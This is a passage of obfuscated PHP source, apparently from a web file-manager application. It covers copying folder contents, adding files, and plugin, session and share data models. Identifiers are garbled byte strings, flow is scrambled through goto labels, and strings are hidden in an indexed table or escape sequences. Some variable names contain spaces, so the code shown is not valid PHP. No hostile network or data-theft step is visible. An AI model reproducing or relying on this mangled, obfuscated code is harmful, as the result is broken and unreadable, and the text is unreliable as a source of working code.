(!$dÕ˘úçêÒÎ || $f«Ö≠óåæ… == REPEAT_RENAME_FOLDER) { $f«Ö≠óåæ… = !1; } goto Eêπ©∫êòŸ; E„éòôﬂ◊¢: $this->updateModifyTime($E¶∏·¬ıÍê); return $F˘Ò›Ë√£´; goto A·ﬂπÍ¶ê´; A·ﬂπÍ¶ê´: } private function _copyChildTo($AƒÆå¬»÷Ü, $eﬁ∏çí∂®™, $dÂˆ”‰Ñá∂, $a›∫Ô¿ÖŸÕ, &$CÎì»éÈ´¬, $aëë¡¨Õîî) { goto BÇû´ÊúÓâ; C¯œàëÑøé: foreach ($dó”ÙîÑØΩ as $DÊÑ âƒÂœ) { $E‚ÇüÃïíã = $FîÀÌ†àﬁˆ[$DÊÑ âƒÂœ[$A¡á†èîÕ·[28]]]; $Dúï¢àÈ• = $E‚ÇüÃïíã[$A¡á†èîÕ·[396]]; $this->_copyApplyMeta($E‚ÇüÃïíã, $CÎì»éÈ´¬); if ($DÊÑ âƒÂœ[$A¡á†èîÕ·[29]] == $A¡á†èîÕ·[77]) { $DÊÑ âƒÂœ[$A¡á†èîÕ·[76]] = $AƒÆå¬»÷Ü->getPathInner($DÊÑ âƒÂœ[$A¡á†èîÕ·[76]]); $this->_copyChildTo($AƒÆå¬»÷Ü, $DÊÑ âƒÂœ[$A¡á†èîÕ·[76]], $Dúï¢àÈ•, $a›∫Ô¿ÖŸÕ, $CÎì»éÈ´¬, $aëë¡¨Õîî); } } goto aÑÖ√’≠öØ; cê∞«å™†Ω: $Fﬁ›öŸü´» = $Fﬁ›öŸü´» ? $Fﬁ›öŸü´» : array($A¡á†èîÕ·[74] => array(), $A¡á†èîÕ·[75] => array()); $dó”ÙîÑØΩ = array_merge($Fﬁ›öŸü´»[$A¡á†èîÕ·[74]], $Fﬁ›öŸü´»[$A¡á†èîÕ·[75]]); $Dçòò›Ö›Ω = $this->_addFiles($AƒÆå¬»÷Ü, $Fﬁ›öŸü´»[$A¡á†èîÕ·[74]], $aëë¡¨Õîî); goto fí¶â¡ëµ€; fí¶â¡ëµ€: $C±ãí˜äàè = array(); foreach ($dó”ÙîÑØΩ as &$DÊÑ âƒÂœ) { goto d÷€‘Ï¨¶∫; DõﬁÍçπÏ·: if ($a›∫Ô¿ÖŸÕ) { $a€ŒËò„òó = $this->fileNameExistCache($dÂˆ”‰Ñá∂, $DÊÑ âƒÂœ[$A¡á†èîÕ·[28]]); if ($a€ŒËò„òó) { if ($DÊÑ âƒÂœ[$A¡á†èîÕ·[404]] || $a›∫Ô¿ÖŸÕ == REPEAT_SKIP) { continue; } if ($a›∫Ô¿ÖŸÕ == REPEAT_REPLACE) { $E‚ÇüÃïíã = $this->sourceInfoCache($a€ŒËò„òó); $fáîÑü»Õ» = $this->fileHistory($E‚ÇüÃïíã, $DÊÑ âƒÂœ[$A¡á†èîÕ·[448]], $DÊÑ âƒÂœ[$A¡á†èîÕ·[78]]); if ($fáîÑü»Õ») { $CÎì»éÈ´¬[$A¡á†èîÕ·[543]][] = $DÊÑ âƒÂœ[$A¡á†èîÕ·[448]]; } continue; } else { if ($a›∫Ô¿ÖŸÕ == REPEAT_RENAME) { $DÊÑ âƒÂœ[$A¡á†èîÕ·[28]] = $this->fileNameAutoCache($dÂˆ”‰Ñá∂, $DÊÑ âƒÂœ[$A¡á†èîÕ·[28]], $a›∫Ô¿ÖŸÕ, !1); } } } } if (!$DÊÑ âƒÂœ[$A¡á†èîÕ·[404]] && $DÊÑ âƒÂœ[$A¡á†èîÕ·[448]]) { $CÎì»éÈ´¬[$A¡á†èîÕ·[543]][] = $DÊÑ âƒÂœ[$A¡á†èîÕ·[448]]; } $C±ãí˜äàè[] = $this->_makeItemData($DÊÑ âƒÂœ, $aâ®ÁâÚ´, $DÊÑ âƒÂœ[$A¡á†èîÕ·[28]]); goto eˆ£ôÂ–‹Â; d÷€‘Ï¨¶∫: if (isset($Dçòò›Ö›Ω[$DÊÑ âƒÂœ[$A¡á†èîÕ·[28]]])) { $DÊÑ âƒÂœ = $Dçòò›Ö›Ω[$DÊÑ âƒÂœ[$A¡á†èîÕ·[28]]]; } $DÊÑ âƒÂœ[$A¡á†èîÕ·[404]] = $DÊÑ âƒÂœ[$A¡á†èîÕ·[29]] == $A¡á†èîÕ·[77]; $DÊÑ âƒÂœ[$A¡á†èîÕ·[406]] = _get($DÊÑ âƒÂœ, $A¡á†èîÕ·[168], $A¡á†èîÕ·[33]); goto f∏èÉØÕ´ù; f∏èÉØÕ´ù: $DÊÑ âƒÂœ[$A¡á†èîÕ·[78]] = _get($DÊÑ âƒÂœ, $A¡á†èîÕ·[78], 0); $DÊÑ âƒÂœ[$A¡á†èîÕ·[448]] = _get($DÊÑ âƒÂœ, $A¡á†èîÕ·[448], 0); if (!isset($DÊÑ âƒÂœ[$A¡á†èîÕ·[582]]) && $DÊÑ âƒÂœ[$A¡á†èîÕ·[448]]) { $CÎì»éÈ´¬[$A¡á†èîÕ·[579]][] = $DÊÑ âƒÂœ[$A¡á†èîÕ·[448]]; } goto DõﬁÍçπÏ·; eˆ£ôÂ–‹Â: } unset($DÊÑ âƒÂœ); goto f—Ë§¬íÓ≈; BÇû´ÊúÓâ: $A¡á†èîÕ· =& $_SERVER[Öíæ€“”≠éÏË]; $aâ®ÁâÚ´ = $this->sourceInfoCache($dÂˆ”‰Ñá∂); $Fﬁ›öŸü´» = $AƒÆå¬»÷Ü->listPath($eﬁ∏çí∂®™); goto cê∞«å™†Ω; f—Ë§¬íÓ≈: if (!empty($C±ãí˜äàè)) { $this->addAll($C±ãí˜äàè); $this->_childrenListSelect($dÂˆ”‰Ñá∂); } $FîÀÌ†àﬁˆ = $this->_childrenList($dÂˆ”‰Ñá∂); $FîÀÌ†àﬁˆ = array_to_keyvalue($FîÀÌ†àﬁˆ, $A¡á†èîÕ·[28]); goto C¯œàëÑøé; aÑÖ√’≠öØ: } private function _addFiles($b¨Œ¬«¥ø€, $EÑîîâöƒû, $cÆó·É‡ûø) { goto B‰µÒàÆπŒ; f¨ëµ∏Ø¨á: $Aøá≤âÑùﬁ = Model($cª√øüÚíı[585]); $FÏ∫ˆÂÈ∞È = $Aøá≤âÑùﬁ->where($bœÉÓÒË‰†)->select(); $FÏ∫ˆÂÈ∞È = $FÏ∫ˆÂÈ∞È ? $FÏ∫ˆÂÈ∞È : array(); goto Fá£∏ÍÕ◊é; Cï√Ê∂Í•£: $FÏ∫ˆÂÈ∞È = $FÏ∫ˆÂÈ∞È ? $FÏ∫ˆÂÈ∞È : array(); foreach ($FÏ∫ˆÂÈ∞È as $bªç≠Èá¢£) { if (!isset($DÍ˜Û⁄éìâ[$bªç≠Èá¢£[$cª√øüÚíı[170]]])) { continue; } $E„ïò∞“Ÿƒ =& $DÍ˜Û⁄éìâ[$bªç≠Èá¢£[$cª√øüÚíı[170]]]; foreach ($E„ïò∞“Ÿƒ as &$aˆò Ûú„ù) { $aˆò Ûú„ù[$cª√øüÚíı[448]] = $bªç≠Èá¢£[$cª√øüÚíı[448]]; } unset($aˆò Ûú„ù); } $dÿ¶ñ…œ ª = array(); goto d„¶çØâ°´; cáﬁπ±ºƒí: foreach ($EÑîîâöƒû as &$aˆò Ûú„ù) { goto e˜øøÀëÕ˜; Bâ’ÊòÛå°: $aˆò Ûú„ù[$cª√øüÚíı[170]] = $dı…ÿÌÃëÆ; Hook::trigger($cª√øüÚíı[584], $aˆò Ûú„ù); $DÍ˜Û⁄éìâ[$dı…ÿÌÃëÆ][] =& $aˆò Ûú„ù; goto DÆ¯Ç˘ç‘’; DÆ¯Ç˘ç‘’: if (count($DÍ˜Û⁄éìâ[$dı…ÿÌÃëÆ]) > 1) { $aˆò Ûú„ù[$cª√øüÚíı[582]] = !0; } goto C·Ÿ¿‡»å; AäøŸÜÒÊº: $dı…ÿÌÃëÆ = $b¨Œ¬«¥ø€->hashMd5($aˆò Ûú„ù[$cª√øüÚíı[76]]); if (strlen($dı…ÿÌÃëÆ) > 10 && !isset($DÍ˜Û⁄éìâ[$dı…ÿÌÃëÆ])) { $DÍ˜Û⁄éìâ[$dı…ÿÌÃëÆ] = array(); } $aˆò Ûú„ù[$cª√øüÚíı[171]] = $D¡÷„‚¡üâ; goto Bâ’ÊòÛå°; e˜øøÀëÕ˜: Hook::trigger($cª√øüÚíı[583], $aˆò Ûú„ù); $aˆò Ûú„ù[$cª√øüÚíı[76]] = $b¨Œ¬«¥ø€->getPathInner($aˆò Ûú„ù[$cª√øüÚíı[76]]); $D¡÷„‚¡üâ = $b¨Œ¬«¥ø€->hashSimple($aˆò Ûú„ù[$cª√øüÚíı[76]]); goto AäøŸÜÒÊº; C·Ÿ¿‡»å: } unset($aˆò Ûú„ù); $bœÉÓÒË‰† = array($cª√øüÚíı[170] => array($cª√øüÚíı[7], array_keys($DÍ˜Û⁄éìâ))); goto f¨ëµ∏Ø¨á; B‰µÒàÆπŒ: $cª√øüÚíı =& $_SERVER[Öíæ€“”≠éÏË]; if (!$EÑîîâöƒû || count($EÑîîâöƒû) == 0) { return array(); } $DÍ˜Û⁄éìâ = array(); goto cáﬁπ±ºƒí; d„¶çØâ°´: foreach ($EÑîîâöƒû as $dã§í¢º¯°) { $dÿ¶ñ…œ ª[$dã§í¢º¯°[$cª√øüÚíı[28]]] = $dã§í¢º¯°; } return $dÿ¶ñ…œ ª; goto aáÚâßÀÈã; A‰ÂÆﬁﬂ≈⁄: $Aøá≤âÑùﬁ->addAll($FıﬂªÑÉÓ—); $bœÉÓÒË‰† = array($cª√øüÚíı[170] => array($cª√øüÚíı[7], array_keys($DÍ˜Û⁄éìâ))); $FÏ∫ˆÂÈ∞È = $Aøá≤âÑùﬁ->where($bœÉÓÒË‰†)->select(); goto Cï√Ê∂Í•£; Fá£∏ÍÕ◊é: foreach ($FÏ∫ˆÂÈ∞È as $bªç≠Èá¢£) { if (!isset($DÍ˜Û⁄éìâ[$bªç≠Èá¢£[$cª√øüÚíı[170]]])) { continue; } $dÇ∞ªï∏ä≥ = $DÍ˜Û⁄éìâ[$bªç≠Èá¢£[$cª√øüÚíı[170]]]; foreach ($dÇ∞ªï∏ä≥ as &$aˆò Ûú„ù) { $aˆò Ûú„ù[$cª√øüÚíı[448]] = $bªç≠Èá¢£[$cª√øüÚíı[448]]; $aˆò Ûú„ù[$cª√øüÚíı[582]] = !0; } unset($aˆò Ûú„ù); } $FıﬂªÑÉÓ— = array(); foreach ($EÑîîâöƒû as $BìÏöàÙ∫ì) { if (isset($BìÏöàÙ∫ì[$cª√øüÚíı[582]]) && $BìÏöàÙ∫ì[$cª√øüÚíı[582]]) { continue; } $bä¯†ü≤ˆò = $b¨Œ¬«¥ø€->getPathInner($BìÏöàÙ∫ì[$cª√øüÚíı[76]]); $a‹π≤ˆû§® = $Aøá≤âÑùﬁ->addFileMake($bä¯†ü≤ˆò, $BìÏöàÙ∫ì[$cª√øüÚíı[78]], $BìÏöàÙ∫ì[$cª√øüÚíı[171]], $BìÏöàÙ∫ì[$cª√øüÚíı[170]], $BìÏöàÙ∫ì[$cª√øüÚíı[28]], $cÆó·É‡ûø); $FıﬂªÑÉÓ—[] = $a‹π≤ˆû§®; } goto A‰ÂÆﬁﬂ≈⁄; aáÚâßÀÈã: } } define($_SERVER[Öíæ€“”≠éÏË][586], $_SERVER[Öíæ€“”≠éÏË][587]); goto EËÌ·ãÓÎº; BÎâ‚¶Ñ™ã: class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\145\x6d\x2e\160\x6c\165\x67\x69\x6e\114\x69\163\164"; public $field = array("\x6e\x61\155\145", "\x73\x74\x61\164\165\x73", "\162\145\x67\x69\x65\x73\x74", "\x63\157\156\146\151\x67"); public function loadList($c≥‡Ò°ä√í = false) { $Eä⁄Óã∞≠í = array_to_keyvalue($this->listData(), $_SERVER[Öíæ€“”≠éÏË][28]); if ($c≥‡Ò°ä√í) { return $Eä⁄Óã∞≠í[$c≥‡Ò°ä√í]; } return $Eä⁄Óã∞≠í; } public function init() { $a©«≥ìÀº« =& $_SERVER[Öíæ€“”≠éÏË]; Hook::trigger($a©«≥ìÀº«[1823]); $BπØúª√Ñß = $this->loadPluginList(); foreach ($BπØúª√Ñß as $cÃœá÷å¿Ã => $eËó≥¢°©ƒ) { $e„øÿåö’† = $this->appAllow($cÃœá÷å¿Ã, $eËó≥¢°©ƒ); if (!$e„øÿåö’†) { continue; } foreach ($eËó≥¢°©ƒ[$a©«≥ìÀº«[1824]] as $d∏ﬂ£ﬂøÑü => $F“ª” ∆∂Õ) { Hook::bind($d∏ﬂ£ﬂøÑü, $F“ª” ∆∂Õ); } } Hook::trigger($a©«≥ìÀº«[1825]); Hook::trigger(ACTION); } public function appAllow($f’Œå“¯äí, $b„ôô≈„ıÀ, $Düõ–¬≠ § = true) { $EÌó©≥ı∞« =& $_SERVER[Öíæ€“”≠éÏË]; $CÓÁÜƒØé˘ = PLUGIN_DIR . $f’Œå“¯äí . $EÌó©≥ı∞«[1826]; if (!is_array($b„ôô≈„ıÀ) || !is_array($b„ôô≈„ıÀ[$EÌó©≥ı∞«[1824]]) || $b„ôô≈„ıÀ[$EÌó©≥ı∞«[723]] != 1 || !is_file($CÓÁÜƒØé˘)) { return !1; } if ($GLOBALS[$EÌó©≥ı∞«[486]] == 1) { return !0; } if ($Düõ–¬≠ § && !Action($EÌó©≥ı∞«[1827])->checkAuth($f’Œå“¯äí)) { return !1; } return !0; } public function unInstall($eÇËôΩœﬁÂ) { $BŒﬂàÜë¯ =& $_SERVER[Öíæ€“”≠éÏË]; $D¡ã¨√ë–Ç = $this->loadList($eÇËôΩœﬁÂ); if (file_exists(PLUGIN_DIR . $eÇËôΩœﬁÂ)) { Hook::apply($eÇËôΩœﬁÂ . $BŒﬂàÜë¯[1828]); } $this->remove($D¡ã¨√ë–Ç[$BŒﬂàÜë¯[394]]); } public function changeStatus($e≠ÌúáıÒÕ, $CÊÔ“áØÿ”) { $Eê…‹¡Áëè =& $_SERVER[Öíæ€“”≠éÏË]; $DÒµÆ ¶º· = $this->loadList($e≠ÌúáıÒÕ); if ($CÊÔ“áØÿ”) { Hook::apply($e≠ÌúáıÒÕ . $Eê…‹¡Áëè[1829]); } $this->update($DÒµÆ ¶º·[$Eê…‹¡Áëè[394]], array($Eê…‹¡Áëè[1830] => $CÊÔ“áØÿ”)); } public function appRegist($F‹ûŒò›ÈÈ, $a„…∞àõ⁄ç) { $AÌâüƒƒ‹≤ =& $_SERVER[Öíæ€“”≠éÏË]; $a∏¨…†Ïµç = $this->loadList($F‹ûŒò›ÈÈ); if ($a∏¨…†Ïµç) { $this->update($a∏¨…†Ïµç[$AÌâüƒƒ‹≤[394]], array($AÌâüƒƒ‹≤[1824] => $a„…∞àõ⁄ç)); } else { $C˘Õèâ©à» = array($AÌâüƒƒ‹≤[28] => $F‹ûŒò›ÈÈ, $AÌâüƒƒ‹≤[1824] => $a„…∞àõ⁄ç, $AÌâüƒƒ‹≤[723] => 0, $AÌâüƒƒ‹≤[6] => $this->getConfigDefault($F‹ûŒò›ÈÈ)); $this->insert($C˘Õèâ©à»); } } public function getConfigDefault($B«åÃúò÷¬) { $BÌËáô±€ı =& $_SERVER[Öíæ€“”≠éÏË]; $a†ùµ∆Òë = array(); $D…Öåõï‡– = $this->getPackageJson($B«åÃúò÷¬); if (!$D…Öåõï‡– && is_array($D…Öåõï‡–[$BÌËáô±€ı[1831]])) { return $a†ùµ∆Òë; } foreach ($D…Öåõï‡–[$BÌËáô±€ı[1831]] as $e∂Á§◊ÊçÊ => $fé«ÇÈÁ≈â) { if (!isset($fé«ÇÈÁ≈â[$BÌËáô±€ı[372]]) || isset($a†ùµ∆Òë[$e∂Á§◊ÊçÊ])) { continue; } $a†ùµ∆Òë[$e∂Á§◊ÊçÊ] = $fé«ÇÈÁ≈â[$BÌËáô±€ı[372]]; } return $a†ùµ∆Òë; } public function getPackageJson($eÌ®‡ºéÓ‹) { return Hook::apply($eÌ®‡ºéÓ‹ . $_SERVER[Öíæ€“”≠éÏË][1832]); } public function getConfig($A√Ê†”ÇÑ∑, $aÑ£≥â’ÓÙ = false) { $cèä∫Ñ»ˆ™ =& $_SERVER[Öíæ€“”≠éÏË]; $F◊ÖÜ⁄Âá¥ = array(); $dû´Ò‹õË± = $this->loadList($A√Ê†”ÇÑ∑); if ($dû´Ò‹õË± && is_array($dû´Ò‹õË±[$cèä∫Ñ»ˆ™[6]])) { $F◊ÖÜ⁄Âá¥ = $dû´Ò‹õË±[$cèä∫Ñ»ˆ™[6]]; } if (!$F◊ÖÜ⁄Âá¥ || $aÑ£≥â’ÓÙ) { $F◊ÖÜ⁄Âá¥ = $this->getConfigDefault($A√Ê†”ÇÑ∑); } return $F◊ÖÜ⁄Âá¥; } public function setConfig($cˆ¬Í√ÿâí, $BÉ÷◊ô¡ñÚ = false) { goto e†ÿìëΩñà; f∆Õ ‡†ë©: $eä—Ñ€¿Ï∑ = $eõß≠É’Í€[$Cë°Ô∫¡›ë[6]]; if ($BÉ÷◊ô¡ñÚ == !1) { $eä—Ñ€¿Ï∑ = array(); $BÉ÷◊ô¡ñÚ = $this->getConfigDefault($cˆ¬Í√ÿâí); } foreach ($BÉ÷◊ô¡ñÚ as $båßåûä⁄⁄ => $bæÀéòÙÀ€) { $eä—Ñ€¿Ï∑[$båßåûä⁄⁄] = is_string($bæÀéòÙÀ€) ? trim($bæÀéòÙÀ€) : $bæÀéòÙÀ€; } goto BïææÂ“≈ó; BïææÂ“≈ó: $this->update($eõß≠É’Í€[$Cë°Ô∫¡›ë[394]], array($Cë°Ô∫¡›ë[6] => $eä—Ñ€¿Ï∑)); goto d¥Œ≥ÕÓä“; e†ÿìëΩñà: $Cë°Ô∫¡›ë =& $_SERVER[Öíæ€“”≠éÏË]; $eõß≠É’Í€ = $this->loadList($cˆ¬Í√ÿâí); if (!$eõß≠É’Í€) { return !1; } goto f∆Õ ‡†ë©; d¥Œ≥ÕÓä“: } public function viewList() { goto b«›˜íûÔ˘; b¶Ñå«üë‚: return $dó€≈ŸÃ‹÷; goto eßâ¡„ÁŸœ; Fäêâ∫ó“Î: $bƒ±∑£◊Á∆ = $this->loadPluginList(); $dó€≈ŸÃ‹÷ = array(); foreach ($bƒ±∑£◊Á∆ as $cÕ·§àˆ·Í => $F›ñï∞‹∑–) { unset($F›ñï∞‹∑–[$EÛéîæ‹èâ[1824]], $F›ñï∞‹∑–[$EÛéîæ‹èâ[6]]); $Bﬂæ‚ñ–ëƒ = PLUGIN_DIR . $F›ñï∞‹∑–[$EÛéîæ‹èâ[28]] . $EÛéîæ‹èâ[1826]; if (!is_file($Bﬂæ‚ñ–ëƒ)) { continue; } $C˜âû¿ Íä = Hook::apply($F›ñï∞‹∑–[$EÛéîæ‹èâ[28]] . $EÛéîæ‹èâ[1832]); if (is_array($C˜âû¿ Íä)) { $dó€≈ŸÃ‹÷[$cÕ·§àˆ·Í] = array_merge($F›ñï∞‹∑–, $C˜âû¿ Íä); } } goto b¶Ñå«üë‚; b«›˜íûÔ˘: $EÛéîæ‹èâ =& $_SERVER[Öíæ€“”≠éÏË]; $bƒ±∑£◊Á∆ = $this->loadList(); $this->pluginScan($bƒ±∑£◊Á∆); goto Fäêâ∫ó“Î; eßâ¡„ÁŸœ: } private function loadPluginList() { $Fı¶ßà®·ﬁ =& $_SERVER[Öíæ€“”≠éÏË]; $e–◊ÇÖöÓ’ = $this->loadList(); if (strtolower(MOD) == $Fı¶ßà®·ﬁ[1833]) { return $e–◊ÇÖöÓ’; } $aà®µß∏åç = Hook::trigger($Fı¶ßà®·ﬁ[1834], $e–◊ÇÖöÓ’); if ($e–◊ÇÖöÓ’ && !$aà®µß∏åç) { die; } return $aà®µß∏åç ? $aà®µß∏åç : $e–◊ÇÖöÓ’; } private function pluginScan($DÌ‰ºµòõÛ) { $D‘ìùÆ™ œ =& $_SERVER[Öíæ€“”≠éÏË]; recursion_dir(PLUGIN_DIR, $e∆‰∆ùçƒá, $fÿ‡’Í∆åÎ, 0); foreach ($e∆‰∆ùçƒá as $eî…ÂÑ—£ä) { $cÏà›ÂÑÔ∆ = get_path_this($eî…ÂÑ—£ä); if (isset($DÌ‰ºµòõÛ[$cÏà›ÂÑÔ∆]) || !file_exists($eî…ÂÑ—£ä . $D‘ìùÆ™ œ[1835]) || !file_exists($eî…ÂÑ—£ä . $D‘ìùÆ™ œ[1826])) { continue; } Hook::apply($cÏà›ÂÑÔ∆ . $D‘ìùÆ™ œ[1829]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\163\x74\x65\x6d\x5f\x73\145\x73\163\x69\x6f\156"; public function get($c∫îßÁ©‘•) { $eÛ»âÖÛ·ä =& $_SERVER[Öíæ€“”≠éÏË]; $Dë˘äÑ€Ã† = $this->where(array($eÛ»âÖÛ·ä[1836] => $c∫îßÁ©‘•))->find(); if (!is_array($Dë˘äÑ€Ã†)) { return !1; } return $Dë˘äÑ€Ã†[$eÛ»âÖÛ·ä[728]]; } public function set($B™ÊÆ®Îâ±, $b»⁄ÿÉÍ≥Ã, $aÙ√∏µÙéí = 3600) { $aª©È∏ú¡í =& $_SERVER[Öíæ€“”≠éÏË]; $E¡ÉÉÌŒá£ = array($aª©È∏ú¡í[1836] => $B™ÊÆ®Îâ±, $aª©È∏ú¡í[1745] => $b»⁄ÿÉÍ≥Ã, $aª©È∏ú¡í[1837] => $aÙ√∏µÙéí + time()); if (Session::get($aª©È∏ú¡í[1838])) { $E¡ÉÉÌŒá£[$aª©È∏ú¡í[1538]] = Session::get($aª©È∏ú¡í[1838]); } else { $E¡ÉÉÌŒá£[$aª©È∏ú¡í[1538]] = 0; } if ($this->get($B™ÊÆ®Îâ±)) { return $this->where(array($aª©È∏ú¡í[1836] => $B™ÊÆ®Îâ±))->save($E¡ÉÉÌŒá£); } else { return $this->add($E¡ÉÉÌŒá£, array(), !0); } } public function remove($D‰ˆ‘µ¥êà) { return $this->where(array($_SERVER[Öíæ€“”≠éÏË][1836] => $D‰ˆ‘µ¥êà))->delete(); } public function clearTimeout() { return $this->where($_SERVER[Öíæ€“”≠éÏË][1839] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\141\162\145"; protected $dataAuto = array(array("\155\x6f\144\151\146\171\124\151\x6d\145", "\164\151\x6d\x65", "\151\x6e\x73\x65\x72\164\x2c\165\160\144\141\x74\x65", "\x66\165\x6e\143\164\151\x6f\x6e"), array("\143\162\145\x61\164\x65\124\151\155\x65", "\x74\151\155\145", "\151\x6e\x73\x65\x72\164", "\146\165\x6e\143\x74\151\157\156"), array("\157\x70\x74\x69\x6f\156\163", '', "\151\x6e\x73\x65\162\164\x2c\165\160\144\141\x74\x65\x2c\x73\145\154\x65\x63\164", "\x6a\x73\x6f\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($E√’©öÍ‰ﬁ) { $búŒ”»æòï =& $_SERVER[Öíæ€“”≠éÏË]; $aü©§ëÊﬂÉ = isset($E√’©öÍ‰ﬁ[0]) ? $E√’©öÍ‰ﬁ[0] : !1; return array($búŒ”»æòï[1840] => array(USER_ID, $búŒ”»æòï[1841]), $búŒ”»æòï[1783] => array($aü©§ëÊﬂÉ, $búŒ”»æòï[1842])); } protected function listSimple() { $Cë»ãøÿ¯Ü = array($_SERVER[Öíæ€“”≠éÏË][1538] => USER_ID); $bùÒ˘Ó¨≥Ç = $this->field($this->fieldList)->where($Cë»ãøÿ¯Ü)->select(); return $bùÒ˘Ó¨≥Ç ? $bùÒ˘Ó¨≥Ç : array(); } protected function getInfo($b–å∂ÎÒî…, $B∆ñ≥ÔÌ«´ = false) { $cÑ‡¬äì• =& $_SERVER[Öíæ€“”≠éÏË]; if ($B∆ñ≥ÔÌ«´) { return $this->_getShareInfo(array($cÑ‡¬äì•[469] => $b–å∂ÎÒî…)); } $bÊ≥¶à¢’ñ = $this->cacheFunctionGet($cÑ‡¬äì•[1785], $b–å∂ÎÒî…); return $bÊ≥¶à¢’ñ; } public function getInfoByHash($f˘»“≥˜§§) { return $this->_getShareInfo(array($_SERVER[Öíæ€“”≠éÏË][471] => $f˘»“≥˜§§)); } public function getInfoByPath($f±äÀÏãäÆ) { $dÌõœª›€Ø =& $_SERVER[Öíæ€“”≠éÏË]; $BÓüÛâ‹⁄º = array($dÌõœª›€Ø[1538] => USER_ID, $dÌõœª›€Ø[396] => $f±äÀÏãäÆ); return $this->_getShareInfo($BÓüÛâ‹⁄º); } public function getInfoBySourcePath($B¿ﬂÂÚ¯’») { $e£ÿ—É·á£ =& $_SERVER[Öíæ€“”≠éÏË]; $bﬂ¿±æ¶Ÿ = array($e£ÿ—É·á£[1538] => USER_ID, $e£ÿ—É·á£[1080] => $B¿ﬂÂÚ¯’»); return $this->_getShareInfo($bﬂ¿±æ¶Ÿ); } private function _getShareInfo($b„ÎÍ«Òªõ) { goto E∏ªπÑ¨ÙÓ; FÓÆæÏ¶∑˜: if ($BêÀ˘•˘ê‚[$EŸ÷«§Ï¬†[396]] == $EŸ÷«§Ï¬†[191]) { $BêÀ˘•˘ê‚[$EŸ÷«§Ï¬†[85]] = IO::info($BêÀ˘•˘ê‚[$EŸ÷«§Ï¬†[1080]]); } else { $BêÀ˘•˘ê‚[$EŸ÷«§Ï¬†[85]] = Model($EŸ÷«§Ï¬†[1215])->pathInfo($BêÀ˘•˘ê‚[$EŸ÷«§Ï¬†[396]]); } $BêÀ˘•˘ê‚[$EŸ÷«§Ï¬†[1844]] = $B¿Ü∫πâò; return $BêÀ˘•˘ê‚; goto FŸ√öÛø¢€; E∏ªπÑ¨ÙÓ: $EŸ÷«§Ï¬† =& $_SERVER[Öíæ€“”≠éÏË]; $BêÀ˘•˘ê‚ = $this->where($b„ÎÍ«Òªõ)->find(); if (!$BêÀ˘•˘ê‚) { return !1; } goto FÀΩ¶’≈ «; FÀΩ¶’≈ «: $b„ÎÍ«Òªõ = array($EŸ÷«§Ï¬†[469] => $BêÀ˘•˘ê‚[$EŸ÷«§Ï¬†[469]]); $AúΩ‚¿¥ìà = $EŸ÷«§Ï¬†[1843]; $B¿Ü∫πâò = Model($EŸ÷«§Ï¬†[578])->order($EŸ÷«§Ï¬†[394])->field($AúΩ‚¿¥ìà)->where($b„ÎÍ«Òªõ)->select(); goto FÓÆæÏ¶∑˜; FŸ√öÛø¢€: } protected function getInfoAuth($aç≠ØÃ°—´) { $cáˆà∞∞¨¨ =& $_SERVER[Öíæ€“”≠éÏË]; $a≈Ü∏Ã…ƒá = $this->getInfo($aç≠ØÃ°—´); $a≈Ü∏Ã…ƒá[$cáˆà∞∞¨¨[407]] = Model($cáˆà∞∞¨¨[483])->authMake($a≈Ü∏Ã…ƒá[$cáˆà∞∞¨¨[1844]]); return $a≈Ü∏Ã…ƒá; } protected function listData($AåÑïÏî⁄¥ = null, $D®çÔüÏ«È = 300) { $Cëéµº¿øí =& $_SERVER[Öíæ€“”≠éÏË]; $c∂ä∂û€í  = array(array($Cëéµº¿øí[474] => array($Cëéµº¿øí[980], 0), $Cëéµº¿øí[476] => array($Cëéµº¿øí[980], 0), $Cëéµº¿øí[1845] => $Cëéµº¿øí[1799])); if ($AåÑïÏî⁄¥ == $Cëéµº¿øí[1846]) { $c∂ä∂û€í  = array($Cëéµº¿øí[474] => 1); } else { if ($AåÑïÏî⁄¥ == $Cëéµº¿øí[1065]) { $c∂ä∂û€í  = array($Cëéµº¿øí[476] => 1); } } $c∂ä∂û€í [$Cëéµº¿øí[1538]] = USER_ID; $dÀ©¢¥†äÁ = $this->where($c∂ä∂û€í )->selectPage($D®çÔüÏ«È); return $dÀ©¢¥†äÁ; } protected function listToMe($aßÇÿàﬂµÁ = 300) { goto E√ö≤†óµﬂ; BÙÜØåâÏ∞: $A⁄§√Ö˘π´ = $this->field($Fôƒﬁ¯£§Ê)->where($dΩß∆Ü„óê)->select(); foreach ($A⁄§√Ö˘π´ as $eı¢–ë∑¡ÿ => &$a∏Ôæ®—™‚) { $a∏Ôæ®—™‚[$Fﬁ‰ÙúÙ£Ã[1844]] = $d™¢§…ÙâÉ[$a∏Ôæ®—™‚[$Fﬁ‰ÙúÙ£Ã[469]]]; } unset($a∏Ôæ®—™‚); goto B∂üÏì§í∂; F”‚÷√Øñ“: if (!$d™¢§…ÙâÉ) { return $bë€≤ëﬂ¨≈; } $Fôƒﬁ¯£§Ê = $Fﬁ‰ÙúÙ£Ã[1848]; $dΩß∆Ü„óê = array($Fﬁ‰ÙúÙ£Ã[469] => array($Fﬁ‰ÙúÙ£Ã[412], array_keys($d™¢§…ÙâÉ)), $Fﬁ‰ÙúÙ£Ã[1538] => array($Fﬁ‰ÙúÙ£Ã[982], $Fﬁ‰ÙúÙ£Ã[191])); goto BÙÜØåâÏ∞; B∂üÏì§í∂: $AœíÓ≠Â§ü = array($Fﬁ‰ÙúÙ£Ã[1849] => $A⁄§√Ö˘π´, $Fﬁ‰ÙúÙ£Ã[1850] => $bë€≤ëﬂ¨≈[$Fﬁ‰ÙúÙ£Ã[364]]); return $AœíÓ≠Â§ü; goto DË®º¬âƒ´; E√ö≤†óµﬂ: $Fﬁ‰ÙúÙ£Ã =& $_SERVER[Öíæ€“”≠éÏË]; $D∑«Œ”›£™ = Model($Fﬁ‰ÙúÙ£Ã[1847])->userGroupParents(USER_ID); $dΩß∆Ü„óê = array($Fﬁ‰ÙúÙ£Ã[563] => SourceModel::TYPE_USER, $Fﬁ‰ÙúÙ£Ã[485] => USER_ID); goto a¶îÍäˆ—í; a¶îÍäˆ—í: if ($D∑«Œ”›£™) { $dΩß∆Ü„óê = array(array($Fﬁ‰ÙúÙ£Ã[563] => SourceModel::TYPE_USER, $Fﬁ‰ÙúÙ£Ã[485] => USER_ID), 